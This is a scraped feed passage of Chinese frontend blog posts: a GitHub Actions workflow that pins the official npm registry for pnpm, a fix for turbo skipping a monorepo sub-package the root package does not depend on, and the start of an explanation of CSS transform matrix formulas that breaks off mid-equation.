<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9718dae8e36b4afc9eabcb1dec0272d6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcnVhbkNhdA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768846790&amp;x-signature=Hc%2FDSkdrUCGgXNbNtB3%2FzK9QpU0%3D" alt="2026-01-13-02-12-33" loading="lazy"/></p>
<p>最终修改后的工作流如下：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">CI</span>
<span class="hljs-attr">jobs:</span>
  <span class="hljs-attr">tester:</span>
    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span>
    <span class="hljs-attr">env:</span>
      <span class="hljs-comment"># 强制使用官方 npm 镜像源，避免淘宝镜像源版本滞后导致构建失败</span>
      <span class="hljs-comment"># 必须在 job 级别设置，确保从 pnpm/action-setup 和 setup-node 阶段就开始使用官方源</span>
      <span class="hljs-attr">NPM_CONFIG_REGISTRY:</span> <span class="hljs-string">https://registry.npmjs.org/</span>
    <span class="hljs-attr">steps:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">检出分支</span>
        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v4</span>
        <span class="hljs-attr">with:</span>
          <span class="hljs-attr">fetch-depth:</span> <span class="hljs-number">0</span>

      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">安装pnpm</span>
        <span class="hljs-attr">uses:</span> <span class="hljs-string">pnpm/action-setup@v4</span>
        <span class="hljs-attr">with:</span>
          <span class="hljs-attr">run_install:</span> <span class="hljs-string">|
            - recursive: true
              args: [--registry, https://registry.npmjs.org]
            - args: [--registry, https://registry.npmjs.org, --global, "tsx", "turbo"]
</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">安装node</span>
        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@v4</span>
        <span class="hljs-attr">with:</span>
          <span class="hljs-attr">node-version:</span> <span class="hljs-number">22.14</span><span class="hljs-number">.0</span>
          <span class="hljs-attr">cache:</span> <span class="hljs-string">pnpm</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[turbo 根包没有安装子包依赖，导致根包命令运行时匹配缺漏]]></title>    <link>https://juejin.cn/post/7594320543219564590</link>    <guid>https://juejin.cn/post/7594320543219564590</guid>    <pubDate>2026-01-12T18:36:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594320543219564590" data-draft-id="7594309641867214886" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="turbo 根包没有安装子包依赖，导致根包命令运行时匹配缺漏"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2026-01-12T18:36:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ruanCat"/> <meta itemprop="url" content="https://juejin.cn/user/2406144257559271"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            turbo 根包没有安装子包依赖，导致根包命令运行时匹配缺漏
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2406144257559271/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ruanCat
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T18:36:33.000Z" title="Mon Jan 12 2026 18:36:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>摘要</strong>：</p>
<p>在 pnpm + monorepo + turbo 架构中，从根包运行 turbo 构建命令时，turbo 只会匹配根包已安装的工作区子包。如果新增的子包（如 <code>@ruan-cat/claude-notifier</code>）未被根包依赖，则会被构建命令遗漏，导致该子包及其文档都无法构建。解决方案是在根包的 <code>package.json</code> 中显式安装所有需要构建的子包依赖。</p>
</blockquote>
<p>我的项目用了 pnpm + monorepo + turbo 的方案，来实现一揽子 node 包的构建与发布。可是我之前的包都能在流水线内构建，为什么最近新开发的一个子包就不能及时构建呢？怎么会漏东西呢？为什么 turbo 偏偏就漏掉我新增加的 <code>@ruan-cat/claude-notifier</code> 子包呢？</p>
<h2 data-id="heading-0">问题截图</h2>
<p>如图，<code>@ruan-cat/claude-notifier</code> 不仅仅没有完成自身的构建，也没有完成文档构建。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df6c082b4ecc460788c0014faebac6c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcnVhbkNhdA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768847793&amp;x-signature=ytSYn4CIQ9YIoX%2F0VgaTuT7TuYg%3D" alt="2025-10-28-01-53-01" loading="lazy"/></p>
<h2 data-id="heading-1">解决方案</h2>
<p>问 AI 才知道，我在 monorepo 根包内运行 turbo 构建命令，就相当于匹配根包所依赖工作区内的全部子包。因为我根包内没有安装，没有去依赖 <code>@ruan-cat/claude-notifier</code> 这个新的子包，所以无法被匹配到。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a50f0555c8a24e60bbf62eeaad734381~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcnVhbkNhdA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768847793&amp;x-signature=sTw0hUMbSoHOMWdWDMfABtx%2FCV4%3D" alt="2025-10-28-01-53-33" loading="lazy"/></p>
<h2 data-id="heading-2">问题解决</h2>
<p>听 AI 的话，去 monorepo 根包内安装项目内的子包依赖。虽然会让根包膨胀，但也无所谓，因为根包又不发布到镜像源，别人也不看。</p>
<p>后续工作流就能正常运行了，期望的子包如期运行了文档构建命令。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5ae68cd8f034a33bd532be065e2ec4a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcnVhbkNhdA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768847793&amp;x-signature=UeypDLW%2BFM%2FnrS9BIuh938zSvbY%3D" alt="2025-10-28-01-54-34" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深度解析 CSS transform 矩阵核心公式：x' = a*x + c*y + e 与 y' = b*x + d*y + f]]></title>    <link>https://juejin.cn/post/7594320543220170798</link>    <guid>https://juejin.cn/post/7594320543220170798</guid>    <pubDate>2026-01-13T00:06:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594320543220170798" data-draft-id="7592846242176729122" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深度解析 CSS transform 矩阵核心公式：x' = a*x + c*y + e 与 y' = b*x + d*y + f"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-13T00:06:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ycgg"/> <meta itemprop="url" content="https://juejin.cn/user/1926000101039192"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深度解析 CSS transform 矩阵核心公式：x' = a*x + c*y + e 与 y' = b*x + d*y + f
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1926000101039192/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ycgg
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T00:06:45.000Z" title="Tue Jan 13 2026 00:06:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 CSS <code>transform</code> 矩阵体系中，<code>x' = a*x + c*y + e</code> 和 <code>y' = b*x + d*y + f</code> 是 2D 图形变换的「底层坐标计算法则」。所有通过 <code>matrix(a,b,c,d,e,f)</code> 实现的缩放、旋转、倾斜、平移，本质都是通过这两个公式将元素的原始坐标 <code>(x, y)</code> 映射为变换后的新坐标 <code>(x', y')</code>。理解这两个公式，就能彻底看透矩阵参数的联动逻辑和变换本质。</p>
<p>首先明确公式中的核心概念：</p>
<ul>
<li><code>(x, y)</code>：元素上任意一点的「原始坐标」，以元素的「变换原点」（由 <code>transform-origin</code> 定义，默认是元素中心 <code>50% 50%</code>）为坐标系原点，水平向右为 X 轴正方向，垂直向下为 Y 轴正方向；</li>
<li><code>(x', y')</code>：该点经过矩阵变换后的「新坐标」，坐标系原点与原始坐标保持一致，最终元素的整体位置、形态由所有点的新坐标共同决定；</li>
<li><code>a、b、c、d、e、f</code>：对应 <code>matrix</code> 矩阵的 6 个参数，分别控制不同维度的变换，部分参数存在跨轴关联（这也是旋转、倾斜能实现的关键）。</li>
</ul>
<h2 data-id="heading-0">一、公式拆解：每个项的作用与参数逻辑</h2>
<p>两个公式并非孤立，而是通过跨轴参数（<code>b、c</code>）实现复杂变换，我们逐公式、逐项解析，结合参数本质说明其影响。</p>
<h3 data-id="heading-1">1. 新 X 坐标公式：x' = a<em>x + c</em>y + e</h3>
<p>该公式决定了原始点 <code>(x, y)</code> 变换后的水平位置，由「X 轴自身关联项」「Y 轴跨轴关联项」「平移项」三部分组成，缺一不可。</p>
<ul>
<li><strong>a*x：X 轴自身缩放/旋转关联项</strong> <code>a</code> 是 X 轴的核心控制参数，直接作用于原始 X 坐标 <code>x</code>。当仅修改 <code>a</code> 时（其他参数为单位矩阵默认值），<code>a</code> 代表 X 轴的缩放系数：<code>a&gt;1</code> 时 X 轴放大，<code>0&lt;a&lt;1</code> 时 X 轴缩小，<code>a=-1</code> 时 X 轴反向翻转。 而在旋转变换中，<code>a</code> 对应 <code>cosθ</code>（θ 为旋转角度），与 <code>b、c、d</code> 联动，通过 <code>a*x</code> 调节 X 轴方向的旋转偏移，确保旋转后坐标的合理性。</li>
<li><strong>c*y：Y 轴对 X 轴的跨轴影响项（倾斜/旋转关联）</strong> 这是公式的核心难点，也是「非纯缩放/平移变换」的关键。<code>c</code> 本质是 X 轴的倾斜系数，同时参与旋转运算（对应 <code>-sinθ</code>），其作用是让 Y 轴的坐标 <code>y</code> 对 X 轴的最终位置产生影响。 举例：当 <code>c=0.5</code>（其他参数为单位矩阵值）时，X 轴向 Y 轴倾斜，倾斜角度 φ 满足 <code>tanφ = c</code>（即约 26.565°）。此时，原始点的 Y 坐标越大，X 轴方向的偏移量就越大，呈现出“右下倾斜”的效果；而在旋转时，<code>c*y</code> 与 <code>a*x</code> 配合，抵消部分坐标偏移，确保旋转轨迹为正圆。</li>
<li><strong>e：X 轴绝对平移项</strong> <code>e</code> 是 X 轴的平移参数，直接决定元素在水平方向的整体偏移量，单位为像素或百分比。与 <code>a、c</code> 不同，<code>e</code> 是「独立于原始坐标」的常量，不受缩放、旋转的影响——无论原始点 <code>(x, y)</code> 位置如何，都会统一叠加 <code>e</code> 的偏移量。这也是平移能通过矩阵实现的核心（齐次矩阵的作用就是让平移可参与矩阵运算）。</li>
</ul>
<h3 data-id="heading-2">2. 新 Y 坐标公式：y' = b<em>x + d</em>y + f</h3>
<p>该公式决定原始点 <code>(x, y)</code> 变换后的垂直位置，结构与 X 轴公式对称，同样包含「Y 轴自身关联项」「X 轴跨轴关联项」「平移项」三部分。</p>
<ul>
<li><strong>b*x：X 轴对 Y 轴的跨轴影响项（倾斜/旋转关联）</strong> <code>b</code> 与 <code>c</code> 对称，是 Y 轴的倾斜系数，参与旋转运算时对应 <code>sinθ</code>，作用是让 X 轴的坐标 <code>x</code> 对 Y 轴的最终位置产生影响。 举例：当 <code>b=0.5</code>（其他参数为单位矩阵值）时，Y 轴向 X 轴倾斜，倾斜角度 φ 满足 <code>tanφ = b</code>。原始点的 X 坐标越大，Y 轴方向的偏移量就越大，呈现出“左下倾斜”的效果；旋转时，<code>b*x</code> 与 <code>d*y</code> 配合，确保垂直方向的旋转偏移准确。</li>
<li><strong>d*y：Y 轴自身缩放/旋转关联项</strong> <code>d</code> 是 Y 轴的核心控制参数，与 <code>a</code> 对称，直接作用于原始 Y 坐标 <code>y</code>。仅修改 <code>d</code> 时，<code>d</code> 代表 Y 轴的缩放系数：<code>d&gt;1</code> 时 Y 轴放大，<code>0&lt;d&lt;1</code> 时 Y 轴缩小，<code>d=-1</code> 时 Y 轴反向翻转。旋转时，<code>d</code> 对应 <code>cosθ</code>，与 <code>a</code> 保持一致（确保旋转时元素不被拉伸变形）。</li>
<li><strong>f：Y 轴绝对平移项</strong> <code>f</code> 与 <code>e</code> 对称，是 Y 轴的平移参数，决定元素在垂直方向的整体偏移量，同样是独立于原始坐标的常量，不受缩放、旋转影响。</li>
</ul>
<h2 data-id="heading-3">二、关键补充：跨轴关联的本质与矩阵对应关系</h2>
<p>很多人疑惑：为什么 X 轴的最终位置会受 Y 坐标影响（c<em>y），Y 轴位置会受 X 坐标影响（b</em>x）？这本质是矩阵对「线性变换」的封装，而旋转、倾斜等变换本身就是「跨轴联动的」——单独调整某一轴的坐标，无法实现旋转效果。</p>
<p>结合前文提到的 3×3 齐次矩阵，这两个公式正是矩阵乘法的展开结果：</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>a</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>c</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>e</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>b</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>d</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>f</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>×</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>x</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>y</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\begin{bmatrix} x' \\ y' \\ 1 \end{bmatrix} = \begin{bmatrix} a &amp; c &amp; e \\ b &amp; d &amp; f \\ 0 &amp; 0 &amp; 1 \end{bmatrix} \times \begin{bmatrix} x \\ y \\ 1 \end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"/><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"/><span style="width:0.667em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="3.600em" viewbox="0 0 667 3600"><path d="M403 1759 V84 H666 V0 H319 V1759 v0 v1759 h347 v-84&#10;H403z M403 1759 V0 H319 V1759 v0 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span 